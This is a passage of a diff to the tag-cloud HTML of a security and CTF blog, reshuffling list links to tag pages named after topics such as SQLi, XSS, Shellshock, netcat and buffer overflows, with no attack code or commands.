-    </a>
-</li>
-<li class="tag-4">
-    <a href="http://bt3gl.github.io/tag/lamp.html">
-        <i class="icon-tag icon-large"></i>LAMP
-    </a>
-</li>
-<li class="tag-2">
-    <a href="http://bt3gl.github.io/tag/buffer_overflow.html">
-        <i class="icon-tag icon-large"></i>Buffer_Overflow
-    </a>
-</li>
-<li class="tag-2">
-    <a href="http://bt3gl.github.io/tag/linux.html">
-        <i class="icon-tag icon-large"></i>Linux
-    </a>
-</li>
-<li class="tag-4">
-    <a href="http://bt3gl.github.io/tag/unoconv.html">
-        <i class="icon-tag icon-large"></i>unoconv
-    </a>
-</li>
-<li class="tag-3">
-    <a href="http://bt3gl.github.io/tag/vigenere.html">
-        <i class="icon-tag icon-large"></i>Vigenere
-    </a>
-</li>
-<li class="tag-3">
-    <a href="http://bt3gl.github.io/tag/nmap.html">
-        <i class="icon-tag icon-large"></i>Nmap
-    </a>
-</li>
-<li class="tag-4">
-    <a href="http://bt3gl.github.io/tag/garbage_collection.html">
-        <i class="icon-tag icon-large"></i>garbage_collection
-    </a>
-</li>
-<li class="tag-4">
-    <a href="http://bt3gl.github.io/tag/osi_model.html">
-        <i class="icon-tag icon-large"></i>OSI_Model
-    </a>
-</li>
-<li class="tag-4">
-    <a href="http://bt3gl.github.io/tag/kismet.html">
-        <i class="icon-tag icon-large"></i>Kismet
-    </a>
-</li>
-<li class="tag-4">
-    <a href="http://bt3gl.github.io/tag/oracle.html">
-        <i class="icon-tag icon-large"></i>Oracle
-    </a>
-</li>
-<li class="tag-4">
-    <a href="http://bt3gl.github.io/tag/stack_overflow-nop.html">
-        <i class="icon-tag icon-large"></i>Stack_Overflow NOP
-    </a>
-</li>
-<li class="tag-4">
-    <a href="http://bt3gl.github.io/tag/assembly.html">
-        <i class="icon-tag icon-large"></i>Assembly
-    </a>
-</li>
-<li class="tag-4">
-    <a href="http://bt3gl.github.io/tag/burpsuite.html">
-        <i class="icon-tag icon-large"></i>BurpSuite
-    </a>
-</li>
-<li class="tag-4">
-    <a href="http://bt3gl.github.io/tag/ifconfig.html">
-        <i class="icon-tag icon-large"></i>ifconfig
-    </a>
-</li>
-<li class="tag-4">
-    <a href="http://bt3gl.github.io/tag/mem.html">
-        <i class="icon-tag icon-large"></i>mem
-    </a>
-</li>
-<li class="tag-4">
-    <a href="http://bt3gl.github.io/tag/hashcat.html">
-        <i class="icon-tag icon-large"></i>hashcat
-    </a>
-</li>
-<li class="tag-4">
-    <a href="http://bt3gl.github.io/tag/pgp.html">
-        <i class="icon-tag icon-large"></i>PGP
     </a>
 </li>
 <li class="tag-2">
@@ -630,28 +447,58 @@
     </a>
 </li>
 <li class="tag-4">
-    <a href="http://bt3gl.github.io/tag/readelf.html">
-        <i class="icon-tag icon-large"></i>readelf
+    <a href="http://bt3gl.github.io/tag/arp.html">
+        <i class="icon-tag icon-large"></i>ARP
     </a>
 </li>
 <li class="tag-4">
-    <a href="http://bt3gl.github.io/tag/base64.html">
-        <i class="icon-tag icon-large"></i>base64
+    <a href="http://bt3gl.github.io/tag/rce.html">
+        <i class="icon-tag icon-large"></i>RCE
     </a>
 </li>
 <li class="tag-4">
-    <a href="http://bt3gl.github.io/tag/sqli.html">
-        <i class="icon-tag icon-large"></i>SQLi
+    <a href="http://bt3gl.github.io/tag/stack_overflow-nop.html">
+        <i class="icon-tag icon-large"></i>Stack_Overflow NOP
     </a>
 </li>
 <li class="tag-4">
-    <a href="http://bt3gl.github.io/tag/ocsp.html">
-        <i class="icon-tag icon-large"></i>OCSP
+    <a href="http://bt3gl.github.io/tag/cache.html">
+        <i class="icon-tag icon-large"></i>cache
     </a>
 </li>
 <li class="tag-4">
-    <a href="http://bt3gl.github.io/tag/scapy.html">
-        <i class="icon-tag icon-large"></i>scapy
+    <a href="http://bt3gl.github.io/tag/brute_force.html">
+        <i class="icon-tag icon-large"></i>Brute_Force
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/telnet.html">
+        <i class="icon-tag icon-large"></i>telnet
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/iwconfig.html">
+        <i class="icon-tag icon-large"></i>iwconfig
+    </a>
+</li>
+<li class="tag-1">
+    <a href="http://bt3gl.github.io/tag/csaw.html">
+        <i class="icon-tag icon-large"></i>CSAW
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/hashcat.html">
+        <i class="icon-tag icon-large"></i>hashcat
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/jit.html">
+        <i class="icon-tag icon-large"></i>JIT
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/osi_model.html">
+        <i class="icon-tag icon-large"></i>OSI_Model
     </a>
 </li>
 <li class="tag-4">
@@ -660,13 +507,28 @@
     </a>
 </li>
 <li class="tag-4">
-    <a href="http://bt3gl.github.io/tag/cms.html">
-        <i class="icon-tag icon-large"></i>CMS
+    <a href="http://bt3gl.github.io/tag/gpg.html">
+        <i class="icon-tag icon-large"></i>GPG
+    </a>
+</li>
+<li class="tag-3">
+    <a href="http://bt3gl.github.io/tag/command_injection.html">
+        <i class="icon-tag icon-large"></i>Command_Injection
     </a>
 </li>
 <li class="tag-4">
-    <a href="http://bt3gl.github.io/tag/bytecode.html">
-        <i class="icon-tag icon-large"></i>bytecode
+    <a href="http://bt3gl.github.io/tag/unoconv.html">
+        <i class="icon-tag icon-large"></i>unoconv
+    </a>
+</li>
+<li class="tag-3">
+    <a href="http://bt3gl.github.io/tag/steganography.html">
+        <i class="icon-tag icon-large"></i>Steganography
+    </a>
+</li>
+<li class="tag-3">
+    <a href="http://bt3gl.github.io/tag/tr.html">
+        <i class="icon-tag icon-large"></i>tr
     </a>
 </li>
 <li class="tag-4">
@@ -675,13 +537,13 @@
     </a>
 </li>
 <li class="tag-4">
-    <a href="http://bt3gl.github.io/tag/arp_cache_poisining.html">
-        <i class="icon-tag icon-large"></i>ARP_Cache_Poisining
+    <a href="http://bt3gl.github.io/tag/unicode.html">
+        <i class="icon-tag icon-large"></i>Unicode
     </a>
 </li>
 <li class="tag-4">
-    <a href="http://bt3gl.github.io/tag/request.html">
-        <i class="icon-tag icon-large"></i>request
+    <a href="http://bt3gl.github.io/tag/chaosreader.html">
+        <i class="icon-tag icon-large"></i>Chaosreader
     </a>
 </li>
 <li class="tag-3">
@@ -689,19 +551,24 @@
         <i class="icon-tag icon-large"></i>pygenere
     </a>
 </li>
-<li class="tag-3">
-    <a href="http://bt3gl.github.io/tag/php.html">
-        <i class="icon-tag icon-large"></i>PHP
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/mem.html">
+        <i class="icon-tag icon-large"></i>mem
     </a>
 </li>
 <li class="tag-4">
-    <a href="http://bt3gl.github.io/tag/brute_force.html">
-        <i class="icon-tag icon-large"></i>Brute_Force
+    <a href="http://bt3gl.github.io/tag/iframe.html">
+        <i class="icon-tag icon-large"></i>iframe
     </a>
 </li>
-<li class="tag-2">
-    <a href="http://bt3gl.github.io/tag/wireshark.html">
-        <i class="icon-tag icon-large"></i>Wireshark
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/rips.html">
+        <i class="icon-tag icon-large"></i>RIPS
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/pgp.html">
+        <i class="icon-tag icon-large"></i>PGP
     </a>
 </li>
 <li class="tag-4">
@@ -709,14 +576,304 @@
         <i class="icon-tag icon-large"></i>CRLSets
     </a>
 </li>
+<li class="tag-3">
+    <a href="http://bt3gl.github.io/tag/rfi.html">
+        <i class="icon-tag icon-large"></i>RFI
+    </a>
+</li>
 <li class="tag-4">
-    <a href="http://bt3gl.github.io/tag/outguess.html">
-        <i class="icon-tag icon-large"></i>OutGuess
+    <a href="http://bt3gl.github.io/tag/hope.html">
+        <i class="icon-tag icon-large"></i>Hope
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/arp_cache_poisining.html">
+        <i class="icon-tag icon-large"></i>ARP_Cache_Poisining
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/csrf.html">
+        <i class="icon-tag icon-large"></i>CSRF
+    </a>
+</li>
+<li class="tag-2">
+    <a href="http://bt3gl.github.io/tag/javascript.html">
+        <i class="icon-tag icon-large"></i>JavaScript
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/garbage_collection.html">
+        <i class="icon-tag icon-large"></i>garbage_collection
+    </a>
+</li>
+<li class="tag-1">
+    <a href="http://bt3gl.github.io/tag/ctf.html">
+        <i class="icon-tag icon-large"></i>CTF
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/netsh.html">
+        <i class="icon-tag icon-large"></i>netsh
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/tls.html">
+        <i class="icon-tag icon-large"></i>TLS
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/heartbleed.html">
+        <i class="icon-tag icon-large"></i>Heartbleed
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/ocsp.html">
+        <i class="icon-tag icon-large"></i>OCSP
+    </a>
+</li>
+<li class="tag-3">
+    <a href="http://bt3gl.github.io/tag/vigenere.html">
+        <i class="icon-tag icon-large"></i>Vigenere
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/paillier.html">
+        <i class="icon-tag icon-large"></i>Paillier
+    </a>
+</li>
+<li class="tag-2">
+    <a href="http://bt3gl.github.io/tag/linux.html">
+        <i class="icon-tag icon-large"></i>Linux
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/ifconfig.html">
+        <i class="icon-tag icon-large"></i>ifconfig
+    </a>
+</li>
+<li class="tag-3">
+    <a href="http://bt3gl.github.io/tag/chrome.html">
+        <i class="icon-tag icon-large"></i>Chrome
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/shellshock.html">
+        <i class="icon-tag icon-large"></i>Shellshock
+    </a>
+</li>
+<li class="tag-3">
+    <a href="http://bt3gl.github.io/tag/rot13.html">
+        <i class="icon-tag icon-large"></i>ROT13
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/cain__abel.html">
+        <i class="icon-tag icon-large"></i>Cain_&_Abel
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/burpsuite.html">
+        <i class="icon-tag icon-large"></i>BurpSuite
+    </a>
+</li>
+<li class="tag-3">
+    <a href="http://bt3gl.github.io/tag/ssh.html">
+        <i class="icon-tag icon-large"></i>ssh
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/lamp.html">
+        <i class="icon-tag icon-large"></i>LAMP
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/oracle.html">
+        <i class="icon-tag icon-large"></i>Oracle
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/cms.html">
+        <i class="icon-tag icon-large"></i>CMS
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/love.html">
+        <i class="icon-tag icon-large"></i>Love
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/socket.html">
+        <i class="icon-tag icon-large"></i>socket
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/sql_injection.html">
+        <i class="icon-tag icon-large"></i>SQL_injection
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/ltrace.html">
+        <i class="icon-tag icon-large"></i>ltrace
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/assembly.html">
+        <i class="icon-tag icon-large"></i>Assembly
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/decimal.html">
+        <i class="icon-tag icon-large"></i>Decimal
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/coldfusion.html">
+        <i class="icon-tag icon-large"></i>ColdFusion
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/netcat.html">
+        <i class="icon-tag icon-large"></i>netcat
+    </a>
+</li>
+<li class="tag-3">
+    <a href="http://bt3gl.github.io/tag/pdf-parser.html">
+        <i class="icon-tag icon-large"></i>pdf-parser
+    </a>
+</li>
+<li class="tag-3">
+    <a href="http://bt3gl.github.io/tag/nmap.html">
+        <i class="icon-tag icon-large"></i>Nmap
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/qpdf.html">
+        <i class="icon-tag icon-large"></i>qpdf
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/readelf.html">
+        <i class="icon-tag icon-large"></i>readelf
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/crl.html">
+        <i class="icon-tag icon-large"></i>CRL
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/exiftool.html">
+        <i class="icon-tag icon-large"></i>ExifTool
+    </a>
+</li>
+<li class="tag-1">
+    <a href="http://bt3gl.github.io/tag/python.html">
+        <i class="icon-tag icon-large"></i>Python
+    </a>
+</li>
+<li class="tag-3">
+    <a href="http://bt3gl.github.io/tag/lfi.html">
+        <i class="icon-tag icon-large"></i>LFI
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/request.html">
+        <i class="icon-tag icon-large"></i>request
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/pdftotext.html">
+        <i class="icon-tag icon-large"></i>pdftotext
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/bytecode.html">
+        <i class="icon-tag icon-large"></i>bytecode
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/base64.html">
+        <i class="icon-tag icon-large"></i>base64
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/xss.html">
+        <i class="icon-tag icon-large"></i>XSS
+    </a>
+</li>
+<li class="tag-3">
+    <a href="http://bt3gl.github.io/tag/php.html">
+        <i class="icon-tag icon-large"></i>PHP
+    </a>
+</li>
+<li class="tag-3">
+    <a href="http://bt3gl.github.io/tag/sqli.html">
+        <i class="icon-tag icon-large"></i>SQLi
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/apphp.html">
+        <i class="icon-tag icon-large"></i>ApPHP
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/xor.html">
+        <i class="icon-tag icon-large"></i>XOR
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/kismet.html">
+        <i class="icon-tag icon-large"></i>Kismet
     </a>
 </li>
 <li class="tag-4">
     <a href="http://bt3gl.github.io/tag/xssi.html">
         <i class="icon-tag icon-large"></i>XSSI
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/mysql.html">
+        <i class="icon-tag icon-large"></i>MySQL
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/scapy.html">
+        <i class="icon-tag icon-large"></i>scapy
+    </a>
+</li>
+<li class="tag-2">
+    <a href="http://bt3gl.github.io/tag/buffer_overflow.html">
+        <i class="icon-tag icon-large"></i>Buffer_Overflow
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/c.html">
+        <i class="icon-tag icon-large"></i>C
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/jad.html">
+        <i class="icon-tag icon-large"></i>jad
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/bash.html">
+        <i class="icon-tag icon-large"></i>Bash
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/v8.html">
+        <i class="icon-tag icon-large"></i>V8
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/outguess.html">
+        <i class="icon-tag icon-large"></i>OutGuess
+    </a>
+</li>
+<li class="tag-2">
+    <a href="http://bt3gl.github.io/tag/wireshark.html">
+        <i class="icon-tag icon-large"></i>Wireshark
     </a>
 </li>
 
